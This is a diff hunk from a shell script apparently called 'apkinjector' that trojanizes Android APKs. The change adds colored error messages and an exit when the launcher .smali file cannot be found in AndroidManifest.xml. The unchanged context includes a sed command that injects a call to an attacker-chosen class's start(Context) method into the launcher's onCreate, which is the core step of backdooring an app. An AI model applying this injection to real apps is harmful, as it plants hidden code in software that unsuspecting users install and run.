@@ -60,7 +60,13 @@ sed -i 's#"##' /tmp/output_1  			# gets rid of the “
 sed -i 's/\./\//g' /tmp/output_1
 sed -i 's/[ \t]*$//' /tmp/output_1
 launcherSmali=`cat /tmp/output_1`.smali
-echo "Found smali launched in AndroidManifest.xml: $launcherSmali"
+if [ \! -s /tmp/output_1 ]; then 
+    echo -e "\033[31m Was unable to locate the .smali launcher in AndroidManifest.xml with the current grep command in place \x1B[0m"
+    echo "Checkout line 57 in apkinjector"
+    echo "Look for the MAIN function in AndroidManifest.xml located in /tmp/original. The .smali file used in that section is the line you want to grab"
+    exit 1
+fi
+echo -e "\033[32m Found smali launcher in AndroidManifest.xml: $launcherSmali \x1B[0m"
 
 #add injection to smali file
 sed -i "/onCreate(Landroid/ainvoke-static {p0}, Lcom/$VAR1/$VAR2/$VAR3;->start(Landroid/content/Context;)V" /tmp/original/smali/$launcherSmali
